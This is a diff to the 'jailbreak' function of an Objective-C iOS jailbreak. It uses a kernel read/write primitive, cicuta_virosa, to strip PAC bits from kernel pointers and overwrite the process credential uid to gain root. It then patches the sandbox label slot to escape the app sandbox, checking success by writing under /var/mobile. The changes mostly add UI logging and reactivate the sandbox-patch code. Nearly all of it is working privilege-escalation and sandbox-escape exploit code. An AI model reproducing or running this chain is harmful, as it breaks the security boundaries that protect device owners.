@@ -62,82 +62,91 @@ static unsigned off_sandbox_slot = 0x10;
 
 int jailbreak(void *init) {
     ViewController *apiController = [UIApplication sharedApplication].keyWindow.rootViewController;
+    [apiController sendMessageToLog:@"========================= Stage 1 ========================="];
     NSLog(@"Running jailbreak");
+    
     uint64_t task_pac = cicuta_virosa();
+    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Task-PAC: 0x%llx", task_pac]];
     printf("task PAC: 0x%llx\n", task_pac);
+    
     uint64_t task = task_pac | 0xffffff8000000000;
     printf("PAC decrypt: 0x%llx -> 0x%llx\n", task_pac, task);
+    
+    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC-Decrypt: 0x%llx -> 0x%llx", task_pac, task]];
     uint64_t proc_pac;
-    if(SYSTEM_VERSION_LESS_THAN(@"14.0")){
+    
+    if (SYSTEM_VERSION_LESS_THAN(@"14.0")){
         if(IS_PAC){
             proc_pac = read_64(task + 0x388);
         } else {
             proc_pac = read_64(task + 0x380);
         }
     } else {
-        if(IS_PAC){
+        if (IS_PAC){
             proc_pac = read_64(task + 0x3a0);
         } else {
             proc_pac = read_64(task + 0x390);
         }
     }
+    
     printf("proc PAC: 0x%llx\n", proc_pac);
+    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Proc-PAC: 0x%llx", proc_pac]];
+    
     uint64_t proc = proc_pac | 0xffffff8000000000;
     printf("PAC decrypt: 0x%llx -> 0x%llx\n", proc_pac, proc);
+    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC-Decrypt: 0x%llx -> 0x%llx", proc_pac, proc]];
+    
     uint64_t ucred_pac;
+    
     if(SYSTEM_VERSION_LESS_THAN(@"14.0")){
         ucred_pac = read_64(proc + 0x100);
     } else {
         ucred_pac = read_64(proc + 0xf0);
     }
+    
     printf("ucred PAC: 0x%llx\n", ucred_pac);
+    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> uCRED-PAC: 0x%llx", ucred_pac]];
+    
     uint64_t ucred = ucred_pac | 0xffffff8000000000;
     printf("PAC decrypt: 0x%llx -> 0x%llx\n", ucred_pac, ucred);
+    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC-Decrypt: 0x%llx -> 0x%llx", ucred_pac, ucred]];
+    
     uint32_t buffer[5] = {0, 0, 0, 1, 0};
     write_20(ucred + off_ucred_cr_uid, (void*)buffer);
     
     uint32_t uid = getuid();
     printf("getuid() returns %u\n", uid);
+    
+    [apiController sendMessageToLog:@"========================= Stage 2 ========================="];
+    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> getuid() returns %u", uid]];
+    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> whoami: %s", uid == 0 ? "root" : "mobile"]];
+    
     printf("whoami: %s\n", uid == 0 ? "root" : "mobile");
     printf("Escaping sandbox.\n");
     
+        printf("[=========] Patches v1 [=========]\n");
+        /* Sandbox patches */
+        uint64_t cr_label_pac = read_64(ucred + off_ucred_cr_label);
+        uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
+        printf("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
+        printf("Sandbox-Slot: 0x%llx", (cr_label + off_sandbox_slot));
+        write_20(cr_label + off_sandbox_slot, (void*)buffer);
+        printf(" ---> 0x%llx", read_64(cr_label + off_sandbox_slot));
+        [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/escaped" contents:nil attributes:nil];
+        if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/escaped"]){
+            printf("\t\t(success)\n");
+            [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/escaped" error:nil];
+        } else {
+            printf("\t\t(failed)\n");
+            return 1;
+        }
+        setgid(0);
+    
     [apiController sendMessageToLog:@"========================= Stage 3 ========================="];
     
-    uint64_t cr_label_pac = read_64(ucred + off_ucred_cr_label);
-    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
-    printf("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
     
-    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC decrypt: 0x%llx -> 0x%llx", cr_label_pac, cr_label]];
-//    printf("[=========] Patches v1 [=========]\n");
-//    /* Sandbox patches */
-//    uint64_t cr_label_pac = read_64(ucred + off_ucred_cr_label);
-//    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
-////    printf("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
-//    printf("Sandbox-Slot: 0x%llx", (cr_label + off_sandbox_slot));
-//    write_20(cr_label + off_sandbox_slot, (void*)buffer);
-//    printf(" ---> 0x%llx", read_64(cr_label + off_sandbox_slot));
-//    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/escaped" contents:nil attributes:nil];
-//    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/escaped"]){
-//        printf("\t\t(success)\n");
-//        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/escaped" error:nil];
-//    } else {
-//        printf("\t\t(failed)\n");
-//        return 1;
-//    }
-    write_20(cr_label + off_sandbox_slot, (void*)buffer);
+
     
-    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/escaped" contents:nil attributes:nil];
-    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/escaped"]){
-        printf("Escaped sandbox!\n");
-        [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Successfully escaped Sandbox"]];
-        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/escaped" error:nil];
-    } else {
-        printf("Could not escape the sandbox\n");
-        [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Could not escape the Sandbox"]];
-        return 1;
-    }
-    
-    setgid(0);
     uint32_t gid = getgid();
     printf("getgid() returns %u\n", gid);
     printf("whoami: %s\n", uid == 0 ? "root" : "mobile");
